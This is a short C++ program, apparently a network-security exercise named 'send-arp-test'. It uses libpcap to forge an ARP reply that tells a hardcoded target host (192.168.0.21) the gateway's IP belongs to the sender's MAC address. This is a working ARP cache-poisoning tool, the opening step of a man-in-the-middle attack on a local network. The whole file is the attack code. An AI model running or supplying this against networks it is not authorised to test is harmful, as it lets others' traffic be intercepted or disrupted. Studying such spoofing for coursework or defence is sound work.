#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstring>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

bool getMyIp(const char* dev, Ip* ip) {
    int sock;
    struct ifreq ifr;
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1) {
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    *ip = Ip(inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    close(sock);
    return true;
}

bool getMyMac(const char* dev, Mac* mac) {
    int sock;
    struct ifreq ifr;
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock == -1) {
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    close(sock);
    return true;
}
int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac myMac;
    Ip myIp;
    if (!getMyMac(dev, &myMac) || !getMyIp(dev, &myIp)) {
        fprintf(stderr, "Failed to get device information.\n");
        return -1;
    }

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("58:1C:F8:F4:02:54"); // MAC of target
    packet.eth_.smac_ = myMac; // sender's MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); 
    packet.arp_.smac_ = myMac; // sender's MAC
    packet.arp_.sip_ = htonl(Ip("192.168.0.1")); // IP of Gateway
    packet.arp_.tmac_ = Mac("58:1C:F8:F4:02:54"); // MAC of target
    packet.arp_.tip_ = htonl(Ip("192.168.0.21"));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    pcap_close(handle);
    return 0;
}
